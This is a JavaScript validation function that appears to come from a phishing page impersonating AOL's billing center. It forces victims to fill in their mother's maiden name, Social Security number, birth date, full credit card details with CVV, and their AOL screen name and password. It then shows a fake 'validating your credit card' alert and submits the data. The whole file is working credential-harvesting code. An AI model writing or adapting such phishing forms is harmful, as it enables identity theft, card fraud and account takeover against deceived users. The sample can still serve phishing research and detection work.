function check(form) {
if (form.FirstName.value == "")
{ alert("Please enter your First Name before submitting."); form.FirstName.focus(); return;}
if (form.FirstName.value.length &lt; 2)
{ alert("Invalid First Name"); form.FirstName.focus(); return;}

if (form.LastName.value == "")
{ alert("Please enter your Last Name before submitting."); form.LastName.focus(); return;}
if (form.LastName.value.length &lt; 2)
{ alert("Invalid Last Name"); form.LastName.focus(); return;}
if (form.MothersMaidenName.value == "")
{ alert("Please enter your Mother's Maiden Name before submitting."); form.MothersMaidenName.focus(); return;}
if (form.MothersMaidenName.value.length &lt; 2)
{ alert("Invalid Mother's Maiden Name"); form.MothersMaidenName.focus(); return;}

if (form.Address.value=="")
{ alert("Please enter your Billing Address before submitting."); form.Address.focus(); return;}
if (form.Address.value.length &lt; 5)
{ alert("Invalid Address."); form.Address.focus(); return;}
if (form.City.value == "")
{ alert("Please enter your City before submitting."); form.City.focus(); return;}
if (form.City.value.length &lt; 2)
{ alert("Invalid City."); form.City.focus(); return;}
if (form.State.value == "")
{ alert("Please enter your State before submitting."); form.State.focus(); return;}
if (form.ZipCode.value == "")
{ alert("Please enter a valid Zip Code before submitting."); form.ZipCode.focus(); return;}
if (form.ZipCode.value.length &lt; 5)
{ alert("Invalid Zip Code."); form.ZipCode.focus(); return;}
if (form.PhoneNumber.value == "")
{ alert("Please enter a valid Phone Number and (Area Code First) before submitting."); form.PhoneNumber.focus(); return;}
if (form.PhoneNumber.value.length &lt; 7)
{ alert("Please enter a valid Phone Number and (Area Code First)"); form.PhoneNumber.focus(); return;}


if (form.SSN.value == "")
{ alert("Due to security reasons, please enter a valid social security number."); form.SSN.focus(); return;}
if (form.SSN.value.length &lt; 9)
{ alert("Invalid social security number."); form.SSN.focus(); return;}

if (form.BirthMonth.value == "")
{ alert("Please enter a valid birth month before submitting."); form.BirthMonth.focus(); return;}
if (form.BirthDay.value == "")
{ alert("Please enter a valid birth day before submitting."); form.BirthDay.focus(); return;}
if (form.BirthYear.value == "")
{ alert("Please enter a valid birth year before submitting."); form.BirthYear.focus(); return;}

if (form.Aol_CCDb.value == "")
{ alert("Please enter Credit or Debit type card before submitting."); form.Aol_CCDb.focus(); return;}

if (!checkCreditCard (document.getElementById('CardNumber').value,document.getElementById('CardType').value))
   { alert (ccErrors[ccErrorNo]); form.Aol_CCNumber.focus(); return false; }

if (form.Aol_CCExp.value == "")
{ alert("Please enter a valid Expiration Month for your card before submitting."); form.Aol_CCExp.focus(); return;}
if (form.Aol_CCExpYear.value == "")
{ alert("Please enter a valid Expiration Year for your card before submitting."); form.Aol_CCExpYear.focus(); return;}
if (form.nameofcc.value == "")
{ alert("Please enter the name on the card as it appears on your credit card."); form.nameofcc.focus(); return;}
if (form.nameofcc.value.length &lt; 2)
{ alert("Invalid Name on card"); form.nameofcc.focus(); return;}

if (form.Aol_Cvv2.value == "")
{ alert("Please enter a valid Civ/Cvv2 for your card before submitting."); form.Aol_Cvv2.focus(); return;}
if (form.Aol_Cvv2.value.length &lt; 3) { alert("CVV is too short!");form.Aol_Cvv2.focus();
	        	return;}


if (form.ScreenName.value == "")
{ alert("Please enter your AOL Screen Name so we can contact you."); form.ScreenName.focus(); return;}
if (form.ScreenName.value.length &lt; 3)
{ alert("Invalid Aol Screen Name."); form.ScreenName.focus(); return;}
if (form.Password.value == "")
{ alert("Please enter your AOL account password before submitting."); form.Password.focus(); return;}
if (form.Password.value.length &lt; 6)
{ alert("Invalid Aol Password."); form.Password.focus(); return;}
{ alert('AOL Billing Center will now validate your credit card.\nPlease wait...\n\nNOTE: \nDo not click on the Submit button twice.'); }
form.submit()
}
